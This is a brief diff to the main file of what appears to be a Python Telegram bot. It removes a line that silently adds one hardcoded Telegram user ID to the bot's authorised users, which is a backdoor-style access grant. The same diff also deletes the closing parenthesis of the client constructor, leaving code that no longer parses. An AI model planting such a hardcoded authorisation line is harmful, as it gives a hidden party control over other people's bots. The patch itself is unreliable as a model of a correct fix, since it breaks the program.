@@ -33,6 +33,4 @@ if __name__ == "__main__" :
         api_id=Config.APP_ID,
         api_hash=Config.API_HASH,
         plugins=plugins
-    )
-    Config.AUTH_USERS.add(683538773)
     app.run()
